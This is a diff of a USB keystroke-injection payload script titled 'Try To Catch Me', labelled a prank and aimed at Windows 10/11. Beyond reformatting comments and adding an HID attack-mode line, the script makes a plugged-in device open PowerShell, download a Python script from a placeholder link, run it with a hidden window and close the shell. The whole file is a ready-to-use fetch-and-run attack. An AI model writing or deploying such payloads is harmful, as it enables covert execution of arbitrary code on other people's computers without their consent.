@@ -1,17 +1,17 @@
-* ####################################
-* #                                  |
-* # Title        : Try To Catch Me   |
-* # Author       : Aleff             |
-* # Version      : 1.0               |
-* # Category     : Prank             |
-* # Target       : Windows 10/11     |
-* #                                  |
-* ####################################
+####################################
+#                                  #
+# Title        : Try To Catch Me   #
+# Author       : Aleff             #
+# Version      : 1.0               #
+# Category     : Prank             #
+# Target       : Windows 10/11     #
+#                                  #
+####################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - Internet Connection
-
+# Requirements:
+#     - Internet Connection
 
 QUACK DELAY 1000
 QUACK GUI r
@@ -20,12 +20,12 @@ QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 500
 
-* REQUIRED - Set your Python script link
-QUACK STRING Invoke-WebRequest -Uri "SCRIPT-PY-LINK" -OutFile "script.py"
+# REQUIRED - Set your Python script link
+QUACK STRING Invoke-WebRequest -Uri \"SCRIPT-PY-LINK\" -OutFile \"script.py\"
 QUACK ENTER
 QUACK DELAY 500
 
-QUACK STRING Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+QUACK STRING Start-Process python.exe -ArgumentList \"script.py\" -WindowStyle Hidden
 QUACK ENTER
 QUACK DELAY 1000
 QUACK ALT F4
